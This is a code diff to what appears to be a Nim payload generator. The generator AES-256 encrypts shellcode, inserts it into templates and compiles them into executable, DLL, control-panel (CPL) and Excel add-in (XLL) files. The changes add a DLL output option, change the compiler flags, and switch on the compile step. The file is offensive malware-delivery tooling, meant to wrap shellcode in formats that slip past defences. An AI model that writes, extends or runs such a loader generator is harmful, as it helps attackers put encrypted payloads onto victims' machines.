@@ -48,10 +48,10 @@ else:
 
 let
     compileExe: string = r"nim c -d:mingw --opt:none --app=gui --cpu=amd64 -d:strip -d:release -o=simpleexe.exe temp_simpleexe.nim"
-    compileCpl: string = r"nim c -d:mingw --app=lib --nomain --cpu=amd64 -d:strip -o=simplecpl.cpl temp_simplecpl.nim"
-    compileDll: string = r"nim c -d:mingw --app=lib --nomain --cpu=amd64 -d:strip -o=simpledll.dll temp_simpledll.nim"
-    compileXll64: string = r"nim c -d:mingw --app=lib --nomain --cpu=amd64 -d:strip -o=simplexll.xll temp_simplexll.nim"
-    compileXll32: string = r"nim c -d:mingw --app=lib --nomain --cpu=i386 -d:strip -o=simplexll.xll temp_simplexll.nim"
+    compileCpl: string = r"nim c -d:mingw --opt:none --app=lib --nomain --cpu=amd64 -d:strip -d:release -o=simplecpl.cpl temp_simplecpl.nim"
+    compileDll: string = r"nim c -d:mingw --opt:none --app=lib --nomain --cpu=amd64 -d:strip -d:release -o=simpledll.dll temp_simpledll.nim"
+    compileXll64: string = r"nim c -d:mingw --opt:none --app=lib --nomain --cpu=amd64 -d:strip -d:release -o=simplexll.xll temp_simplexll.nim"
+    compileXll32: string = r"nim c -d:mingw --opt:none --app=lib --nomain --cpu=i386 -d:strip -d:release -o=simplexll.xll temp_simplexll.nim"
 
 proc aesencrypt(): void = 
     
@@ -107,6 +107,11 @@ proc generatePayload(): void =
             templateFile = templatePath.readFile()
             tempFile = "temp_simplecpl.nim"
             compileCmd = compileCpl
+        of "dll":
+            templatePath = "templates/simpledll.nim"
+            templateFile = templatePath.readFile()
+            tempFile = "temp_simpledll.nim"
+            compileCmd = compileDll
         of "xll":
             templatePath = "templates/simplexll.nim"
             templateFile = templatePath.readFile()
@@ -124,7 +129,7 @@ proc generatePayload(): void =
     #echo "\n"
     echo "encSC = ", encSC
 
-    let replacement =  toHex(encSC)
+    let replacement = toHex(encSC)
     try:
         echo "[*] Encrypting shellcode using AES-256 CTR!"
         templateFile = templateFile.replace(placeholder, replacement)
@@ -149,10 +154,10 @@ proc generatePayload(): void =
         echo "[-] Error: Cannot add AES IV to template file!"
         quit(1)
 
-    #let compileResults = execCmdEx(compileCmd)
+    let compileResults = execCmdEx(compileCmd)
     #tempFile.removeFile
-    #if verbosity == "verbose":
-     #   echo compileResults.output
+    if verbosity == "verbose":
+        echo compileResults.output
 
 when isMainModule:
     if pCount >= 2:
